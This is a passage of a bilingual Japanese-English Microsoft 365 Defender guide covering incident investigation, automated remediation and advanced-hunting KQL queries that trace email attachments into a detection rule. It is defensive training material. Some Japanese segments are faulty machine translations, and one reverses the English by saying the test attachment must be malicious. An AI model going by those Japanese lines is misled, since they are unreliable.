#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="de377-217">アラート: ユーザーと IP アドレスの調整 (SMB) (ソース: Id 用 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="de377-217">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="de377-218">サーバー メッセージ ブロック (SMB) プロトコルを使用した列挙により、攻撃者は、ネットワークを横方向に移動して特定の機密性の高いアカウントにアクセスするのに役立つ、最近のユーザー ログオン情報を取得できます。</span><span class="sxs-lookup"><span data-stu-id="de377-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="de377-219">この検出では、SMB セッション列挙がドメイン コントローラーに対して実行されると、アラートがトリガーされます。</span><span class="sxs-lookup"><span data-stu-id="de377-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![ユーザーと IP アドレスの再調整に関する Microsoft Defender for Identity アラートのスクリーンショット](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="de377-221">デバイスのタイムラインを確認する [Microsoft Defender for Endpoint]</span><span class="sxs-lookup"><span data-stu-id="de377-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>

<span data-ttu-id="de377-222">このインシデントのさまざまなアラートを調査した後、前に調査したインシデント ページに戻ります。</span><span class="sxs-lookup"><span data-stu-id="de377-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="de377-223">インシデント ページ **の [デバイス** ] タブを選択して、このインシデントに関係するデバイスを確認します。このデバイスは、Microsoft Defender for Endpoint と Microsoft Defender for Identity によって報告されます。</span><span class="sxs-lookup"><span data-stu-id="de377-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="de377-224">攻撃が実行されたデバイスの名前を選択して、その特定のデバイスのエンティティ ページを開きます。</span><span class="sxs-lookup"><span data-stu-id="de377-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="de377-225">このページでは、トリガーされたアラートと関連するイベントを確認できます。</span><span class="sxs-lookup"><span data-stu-id="de377-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="de377-226">[ **タイムライン]** タブを選択してデバイスのタイムラインを開き、デバイスで観察されたイベントと動作を、発生したアラートと一緒に時間順に表示します。</span><span class="sxs-lookup"><span data-stu-id="de377-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![動作を含むデバイスのタイムラインのスクリーンショット](../../media/mtp/fig11.png)

<span data-ttu-id="de377-228">より興味深い動作の一部を展開すると、プロセス ツリーなど、役立つ詳細が提供されます。</span><span class="sxs-lookup"><span data-stu-id="de377-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="de377-229">たとえば、疑わしいプロセスの挿入が観察されたアラート イベントが見 **られるまで下にスクロールします**。</span><span class="sxs-lookup"><span data-stu-id="de377-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="de377-230">この動作 **powershell.exe** プロセス notepad.exeに挿入されたイベントを選択して、この動作の完全なプロセス ツリーを作業ウィンドウの **[イベント** エンティティ] グラフに表示します。</span><span class="sxs-lookup"><span data-stu-id="de377-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="de377-231">必要に応じて、検索バーを使用してフィルター処理を行います。</span><span class="sxs-lookup"><span data-stu-id="de377-231">Use the search bar for filtering if necessary.</span></span>

![選択した PowerShell ファイル作成動作のプロセス ツリーのスクリーンショット](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="de377-233">ユーザー情報を確認する [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="de377-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="de377-234">インシデント ページで 、[ユーザー  ] タブを選択し、攻撃に関与したユーザーの一覧を表示します。</span><span class="sxs-lookup"><span data-stu-id="de377-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="de377-235">この表には、各ユーザーの調査優先度スコアなど、各ユーザーに関する追加情報 **が含** まれている。</span><span class="sxs-lookup"><span data-stu-id="de377-235">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="de377-236">ユーザー名を選択してユーザーのプロファイル ページを開き、さらに調査を行います。</span><span class="sxs-lookup"><span data-stu-id="de377-236">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="de377-237">[リスクの高いユーザーの調査について詳しくは、以下を参照してください](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)。</span><span class="sxs-lookup"><span data-stu-id="de377-237">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>

![Cloud App Security ユーザー ページのスクリーンショット](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="de377-239">調査と修復の自動化</span><span class="sxs-lookup"><span data-stu-id="de377-239">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="de377-240">このシミュレーションの手順を説明する前に、次のビデオを見て、自動自動修復とは何か、ポータルで検索する場所、セキュリティ操作でそれがどのように役立つのかを理解してください。</span><span class="sxs-lookup"><span data-stu-id="de377-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="de377-241">Microsoft 365 セキュリティ センター ポータルでインシデントに戻る。</span><span class="sxs-lookup"><span data-stu-id="de377-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="de377-242">[ **インシデント] ページ** の **[調査** ] タブには、Id 用 Microsoft Defender とエンドポイント用 Microsoft Defender によってトリガーされた自動調査が表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="de377-243">次のスクリーンショットは、Defender for Endpoint によってトリガーされた自動調査のみを表示します。</span><span class="sxs-lookup"><span data-stu-id="de377-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="de377-244">既定では、Defender for Endpoint はキュー内で見つかったアーティファクトを自動的に修復します。修復が必要です。</span><span class="sxs-lookup"><span data-stu-id="de377-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![インシデントに関連する自動調査のスクリーンショット](../../media/mtp/fig14.png)

<span data-ttu-id="de377-246">調査をトリガーしたアラートを選択して、[調査の詳細] **ページを開** きます。</span><span class="sxs-lookup"><span data-stu-id="de377-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="de377-247">次の詳細が表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-247">You'll see the following details:</span></span>

- <span data-ttu-id="de377-248">自動調査をトリガーしたアラート。</span><span class="sxs-lookup"><span data-stu-id="de377-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="de377-249">影響を受け、ユーザーとデバイス。</span><span class="sxs-lookup"><span data-stu-id="de377-249">Impacted users and devices.</span></span> <span data-ttu-id="de377-250">他のデバイスでインジケーターが見つかった場合は、これらの追加のデバイスも一覧表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="de377-251">証拠のリスト。</span><span class="sxs-lookup"><span data-stu-id="de377-251">List of evidence.</span></span> <span data-ttu-id="de377-252">ファイル、プロセス、サービス、ドライバー、ネットワーク アドレスなど、検出および分析されたエンティティ。</span><span class="sxs-lookup"><span data-stu-id="de377-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="de377-253">これらのエンティティは、アラートとの関係の可能性を分析し、良性または悪意のあるエンティティとして評価されます。</span><span class="sxs-lookup"><span data-stu-id="de377-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="de377-254">脅威が見つかりました。</span><span class="sxs-lookup"><span data-stu-id="de377-254">Threats found.</span></span> <span data-ttu-id="de377-255">調査中に検出された既知の脅威。</span><span class="sxs-lookup"><span data-stu-id="de377-255">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="de377-256">タイミングによっては、自動調査がまだ実行されている場合があります。</span><span class="sxs-lookup"><span data-stu-id="de377-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="de377-257">証拠を収集して分析し、結果を確認する前に、プロセスが完了するまで数分待ちます。</span><span class="sxs-lookup"><span data-stu-id="de377-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="de377-258">[調査の **詳細] ページを更新** して、最新の結果を取得します。</span><span class="sxs-lookup"><span data-stu-id="de377-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

![[調査の詳細] ページのスクリーンショット](../../media/mtp/fig15.png)

<span data-ttu-id="de377-260">自動調査の間に、Microsoft Defender for Endpoint は修復を必要とするアーティファクトの 1 つとして挿入された notepad.exe プロセスを特定しました。</span><span class="sxs-lookup"><span data-stu-id="de377-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="de377-261">エンドポイント用 Defender は、自動修復の一環として、疑わしいプロセスの挿入を自動的に停止します。</span><span class="sxs-lookup"><span data-stu-id="de377-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="de377-262">テスト デバイスで <i>notepad.exe</i> プロセスの一覧に表示されなくなる可能性があります。</span><span class="sxs-lookup"><span data-stu-id="de377-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="de377-263">インシデントを解決する</span><span class="sxs-lookup"><span data-stu-id="de377-263">Resolve the incident</span></span>

<span data-ttu-id="de377-264">調査が完了し、修復が確認された後、インシデントを終了します。</span><span class="sxs-lookup"><span data-stu-id="de377-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="de377-265">[インシデント **の管理] を選択します**。</span><span class="sxs-lookup"><span data-stu-id="de377-265">Select **Manage incident**.</span></span> <span data-ttu-id="de377-266">状態を [インシデントの **解決] に設定し** 、関連する分類を選択します。</span><span class="sxs-lookup"><span data-stu-id="de377-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="de377-267">インシデントが解決すると、Microsoft 365 セキュリティ センターと関連するポータルで関連付けられているすべてのアラートが閉じます。</span><span class="sxs-lookup"><span data-stu-id="de377-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Screenshot of the incidents page with the open Manage incident panel where you can click the switch to resolve incident](../../media/mtp/fig16.png)

<span data-ttu-id="de377-269">これにより、インシデント管理と自動調査および修復シナリオの攻撃シミュレーションがラップされます。</span><span class="sxs-lookup"><span data-stu-id="de377-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="de377-270">次のシミュレーションでは、潜在的な悪意のあるファイルに対する予防的な脅威の検出を行います。</span><span class="sxs-lookup"><span data-stu-id="de377-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span>

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="de377-271">高度な検索シナリオ</span><span class="sxs-lookup"><span data-stu-id="de377-271">Advanced hunting scenario</span></span>

> [!NOTE]
> <span data-ttu-id="de377-272">シミュレーションの手順を説明する前に、次のビデオを見て高度なハンティングの概念を理解し、ポータルで検索できる場所を確認し、セキュリティ操作でそれがどのように役立つのか確認してください。</span><span class="sxs-lookup"><span data-stu-id="de377-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="de377-273">ハンティング環境の要件</span><span class="sxs-lookup"><span data-stu-id="de377-273">Hunting environment requirements</span></span>

<span data-ttu-id="de377-274">このシナリオには、1 つの内部メールボックスとデバイスが必要です。</span><span class="sxs-lookup"><span data-stu-id="de377-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="de377-275">テスト メッセージを送信するには、外部メール アカウントも必要です。</span><span class="sxs-lookup"><span data-stu-id="de377-275">You'll also need an external email account to send the test message.</span></span>

1. <span data-ttu-id="de377-276">テナントで Microsoft [365 Defender が有効になっているか確認します](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。</span><span class="sxs-lookup"><span data-stu-id="de377-276">Verify that your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2. <span data-ttu-id="de377-277">電子メールの受信に使用するターゲット メールボックスを特定します。</span><span class="sxs-lookup"><span data-stu-id="de377-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="de377-278">a. </span><span class="sxs-lookup"><span data-stu-id="de377-278">a.</span></span> <span data-ttu-id="de377-279">このメールボックスは、Microsoft Defender が 365 b Office監視する必要があります。</span><span class="sxs-lookup"><span data-stu-id="de377-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span> <span data-ttu-id="de377-280">要件 3 のデバイスは、このメールボックスにアクセスする必要があります。</span><span class="sxs-lookup"><span data-stu-id="de377-280">The device from requirement 3 needs to access this mailbox</span></span>
3. <span data-ttu-id="de377-281">テスト デバイスを構成します。a.</span><span class="sxs-lookup"><span data-stu-id="de377-281">Configure a test device: a.</span></span> <span data-ttu-id="de377-282">Windows 10 バージョン 1903 以降のバージョンを使用している必要があります。</span><span class="sxs-lookup"><span data-stu-id="de377-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="de377-283">b.</span><span class="sxs-lookup"><span data-stu-id="de377-283">b.</span></span> <span data-ttu-id="de377-284">テスト デバイスをテスト ドメインに参加します。</span><span class="sxs-lookup"><span data-stu-id="de377-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="de377-285">c.</span><span class="sxs-lookup"><span data-stu-id="de377-285">c.</span></span> <span data-ttu-id="de377-286">[[ウイルス対策] Windows Defenderオンにする](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。</span><span class="sxs-lookup"><span data-stu-id="de377-286">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="de377-287">ウイルス対策を有効にする際に問題Windows Defender、このトラブルシューティング [トピックを参照してください](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="de377-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="de377-288">d. </span><span class="sxs-lookup"><span data-stu-id="de377-288">d.</span></span> <span data-ttu-id="de377-289">[エンドポイント用 Microsoft Defender にオンボードします](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="de377-289">[Onboard to Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="de377-290">シミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="de377-290">Run the simulation</span></span>

1. <span data-ttu-id="de377-291">外部電子メール アカウントから、テスト環境の要件セクションの手順 2 で識別されたメールボックスに電子メールを送信します。</span><span class="sxs-lookup"><span data-stu-id="de377-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="de377-292">既存の電子メール フィルター ポリシーで許可される添付ファイルを含める。</span><span class="sxs-lookup"><span data-stu-id="de377-292">Include an attachment that will be allowed through any existing email filter policies.</span></span> <span data-ttu-id="de377-293">このファイルは、悪意のあるファイルや実行可能ファイルである必要があります。</span><span class="sxs-lookup"><span data-stu-id="de377-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="de377-294">推奨されるファイルの種類は<i>、.pdf、.exe</i>(許可されている場合)、または Word ファイルOfficeドキュメントを含むファイルです。 <i></i></span><span class="sxs-lookup"><span data-stu-id="de377-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2. <span data-ttu-id="de377-295">テスト環境の要件セクションの手順 3 で定義したデバイスから送信された電子メールを開きます。</span><span class="sxs-lookup"><span data-stu-id="de377-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="de377-296">添付ファイルを開くか、ファイルをデバイスに保存します。</span><span class="sxs-lookup"><span data-stu-id="de377-296">Either open the attachment or save the file to the device.</span></span>

#### <a name="go-hunting"></a><span data-ttu-id="de377-297">ハンティングを行う</span><span class="sxs-lookup"><span data-stu-id="de377-297">Go hunting</span></span>

1. <span data-ttu-id="de377-298">ポータルをsecurity.microsoft.comします。</span><span class="sxs-lookup"><span data-stu-id="de377-298">Open the security.microsoft.com portal.</span></span>

2. <span data-ttu-id="de377-299">高度な検索 **を>に移動します**。</span><span class="sxs-lookup"><span data-stu-id="de377-299">Navigate to **Hunting > Advanced hunting**.</span></span>

   ![M365 セキュリティ センター ポータルナビゲーション バーの高度な検索のスクリーンショット](../../media/mtp/fig17.png)

3. <span data-ttu-id="de377-301">電子メール イベントの収集から始まるクエリを作成します。</span><span class="sxs-lookup"><span data-stu-id="de377-301">Build a query that starts by gathering email events.</span></span>

   1. <span data-ttu-id="de377-302">クエリ ウィンドウで、[新規] を選択します。</span><span class="sxs-lookup"><span data-stu-id="de377-302">From the query pane, select New.</span></span>

   1. <span data-ttu-id="de377-303">スキーマから EmailEvents テーブルをダブルクリックします。</span><span class="sxs-lookup"><span data-stu-id="de377-303">Double-click on the EmailEvents table from the schema.</span></span>

      ```console
      EmailEvents
      ```

   1. <span data-ttu-id="de377-304">時間枠を過去 24 時間に変更します。</span><span class="sxs-lookup"><span data-stu-id="de377-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="de377-305">上記のシミュレーションを実行した際に送信したメールが過去 24 時間以内だったと仮定した場合、それ以外の場合は時間枠を変更します。</span><span class="sxs-lookup"><span data-stu-id="de377-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>

      ![時間枠を変更できる場所のスクリーンショット。](../../media/mtp/fig18.png)

   1. <span data-ttu-id="de377-308">クエリを実行します。</span><span class="sxs-lookup"><span data-stu-id="de377-308">Run the query.</span></span> <span data-ttu-id="de377-309">パイロットの環境によっては、多くの結果が得られます。</span><span class="sxs-lookup"><span data-stu-id="de377-309">You may have many results depending on the environment for the pilot.</span></span>

      > [!NOTE]
      > <span data-ttu-id="de377-310">データの戻り値を制限するフィルター オプションについては、次の手順を参照してください。</span><span class="sxs-lookup"><span data-stu-id="de377-310">See the next step for filtering options to limit data return.</span></span>

      ![高度な検索クエリの結果のスクリーンショット](../../media/mtp/fig19.png)

        > [!NOTE]
        > <span data-ttu-id="de377-312">高度な検索では、クエリ結果が表形式データとして表示されます。</span><span class="sxs-lookup"><span data-stu-id="de377-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="de377-313">グラフなどの他の形式のデータを表示することもできます。</span><span class="sxs-lookup"><span data-stu-id="de377-313">You can also opt to view the data in other format types such as charts.</span></span>

   1. <span data-ttu-id="de377-314">結果を確認し、開いたメールを識別できる場合を確認します。</span><span class="sxs-lookup"><span data-stu-id="de377-314">Look at the results and see if you can identify the email you opened.</span></span> <span data-ttu-id="de377-315">高度な検索でメッセージが表示されるには、最大 2 時間かかる場合があります。</span><span class="sxs-lookup"><span data-stu-id="de377-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="de377-316">メール環境が大きく、結果が多い場合は、[フィルターの表示] オプションを使用 **してメッセージを** 検索できます。</span><span class="sxs-lookup"><span data-stu-id="de377-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span>

      <span data-ttu-id="de377-317">サンプルでは、電子メールは Yahoo アカウントから送信されました。</span><span class="sxs-lookup"><span data-stu-id="de377-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="de377-318">**+** SenderFromDomain セクションの **yahoo.com** 横にあるアイコンをクリックし、[適用]をクリックして選択したドメインをクエリに追加します。</span><span class="sxs-lookup"><span data-stu-id="de377-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span> <span data-ttu-id="de377-319">結果をフィルター処理するには、「シミュレーションの実行」の手順 1 でテスト メッセージの送信に使用したドメインまたは電子メール アカウントを使用します。</span><span class="sxs-lookup"><span data-stu-id="de377-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span> <span data-ttu-id="de377-320">もう一度クエリを実行して、より小さい結果セットを取得し、シミュレーションからのメッセージが表示されるのを確認します。</span><span class="sxs-lookup"><span data-stu-id="de377-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>

      ![フィルターのスクリーンショット。](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. <span data-ttu-id="de377-323">クエリの結果の行をクリックして、レコードを検査できます。</span><span class="sxs-lookup"><span data-stu-id="de377-323">Click the resulting rows from the query so you can inspect the record.</span></span>

      ![高度な検索結果が選択された場合に開く検査レコード側パネルのスクリーンショット](../../media/mtp/fig21.png)

4. <span data-ttu-id="de377-325">メールが表示されるのを確認したので、添付ファイルのフィルターを追加します。</span><span class="sxs-lookup"><span data-stu-id="de377-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="de377-326">環境内の添付ファイルを含むすべてのメールに焦点を当てる。</span><span class="sxs-lookup"><span data-stu-id="de377-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="de377-327">このシナリオでは、環境から送信されるメールではなく、受信メールに重点を置きます。</span><span class="sxs-lookup"><span data-stu-id="de377-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="de377-328">メッセージを見つけるために追加したフィルターを削除し、"|**AttachmentCount > 0 および** **EmailDirection**  ==  **"Inbound""**</span><span class="sxs-lookup"><span data-stu-id="de377-328">Remove any filters you have added to locate your message and add "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**</span></span>

   <span data-ttu-id="de377-329">次のクエリは、すべての電子メール イベントに対する最初のクエリよりも短いリストを持つ結果を表示します。</span><span class="sxs-lookup"><span data-stu-id="de377-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. <span data-ttu-id="de377-330">次に、添付ファイルに関する情報 (ファイル名、ハッシュなど) を結果セットに含める。</span><span class="sxs-lookup"><span data-stu-id="de377-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="de377-331">これを行うには **、EmailAttachmentInfo テーブルを結合** します。</span><span class="sxs-lookup"><span data-stu-id="de377-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="de377-332">参加に使用する一般的なフィールドは、 **この場合は NetworkMessageId** と **RecipientObjectId です**。</span><span class="sxs-lookup"><span data-stu-id="de377-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

   <span data-ttu-id="de377-333">次のクエリには、追加の行 "| も含まれています。 **project-rename EmailTimestamp=Timestamp**" は、次の手順で追加するファイル操作に関連するタイムスタンプと電子メールに関連したタイムスタンプを識別するのに役立ちます。</span><span class="sxs-lookup"><span data-stu-id="de377-333">The following query also includes an additional line "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. <span data-ttu-id="de377-334">次に **、EmailAttachmentInfo** テーブルの **SHA256** 値を使用して、そのハッシュの **DeviceFileEvents** (エンドポイントで発生したファイルアクション) を検索します。</span><span class="sxs-lookup"><span data-stu-id="de377-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span> <span data-ttu-id="de377-335">ここで共通するフィールドは、添付ファイルの SHA256 ハッシュです。</span><span class="sxs-lookup"><span data-stu-id="de377-335">The common field here will be the SHA256 hash for the attachment.</span></span>

   <span data-ttu-id="de377-336">結果の表には、エンドポイント (Microsoft Defender for Endpoint) からの詳細 (デバイス名、実行されたアクション (この場合は FileCreated イベントのみを含むフィルター処理)、ファイルの保存場所が含まれます。</span><span class="sxs-lookup"><span data-stu-id="de377-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="de377-337">プロセスに関連付けられているアカウント名も含まれます。</span><span class="sxs-lookup"><span data-stu-id="de377-337">The account name associated with the process will also be included.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   <span data-ttu-id="de377-338">これで、ユーザーが添付ファイルを開いた、または保存した受信メールを識別するクエリが作成されました。</span><span class="sxs-lookup"><span data-stu-id="de377-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="de377-339">このクエリを絞り込み、特定の送信者ドメイン、ファイル サイズ、ファイルの種類などについてフィルター処理することもできます。</span><span class="sxs-lookup"><span data-stu-id="de377-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7. <span data-ttu-id="de377-340">関数は特別な種類の結合であり、その普及状況、署名者や発行者情報など、ファイルに関するより多くの TI データを取得できます。ファイルの詳細を取得するには **、FileProfile()** 関数エンリッチメントを使用します。</span><span class="sxs-lookup"><span data-stu-id="de377-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc. To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a><span data-ttu-id="de377-341">検出を作成する</span><span class="sxs-lookup"><span data-stu-id="de377-341">Create a detection</span></span>

<span data-ttu-id="de377-342">今後発生した場合に警告を受け取る情報を識別するクエリを作成したら、クエリからカスタム検出を作成できます。</span><span class="sxs-lookup"><span data-stu-id="de377-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span>

<span data-ttu-id="de377-343">カスタム検出は設定した頻度に従ってクエリを実行し、クエリの結果は、選択した影響を受け取ったアセットに基づいてセキュリティの警告を作成します。</span><span class="sxs-lookup"><span data-stu-id="de377-343">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="de377-344">これらのアラートはインシデントに関連付け、製品の 1 つによって生成された他のセキュリティ警告としてトリアージされます。</span><span class="sxs-lookup"><span data-stu-id="de377-344">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1. <span data-ttu-id="de377-345">クエリ ページで、検索に進む手順 7. で追加された行 7 と 8 を削除し、[検出ルールの作成] **をクリックします**。</span><span class="sxs-lookup"><span data-stu-id="de377-345">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span>

   ![高度な検索ページで [検出ルールの作成] をクリックできる場所のスクリーンショット](../../media/mtp/fig22.png)

   > [!NOTE]
   > <span data-ttu-id="de377-347">[検出ルール **の作成]** をクリックし、クエリに構文エラーがある場合、検出ルールは保存されません。</span><span class="sxs-lookup"><span data-stu-id="de377-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won't be saved.</span></span> <span data-ttu-id="de377-348">クエリを二重にチェックして、エラーが発生されていないことを確認します。</span><span class="sxs-lookup"><span data-stu-id="de377-348">Double-check your query to ensure there's no errors.</span></span>

2. <span data-ttu-id="de377-349">必要なフィールドに、セキュリティ チームがアラートを理解できる情報、アラートが生成された理由、および必要なアクションを入力します。</span><span class="sxs-lookup"><span data-stu-id="de377-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span>

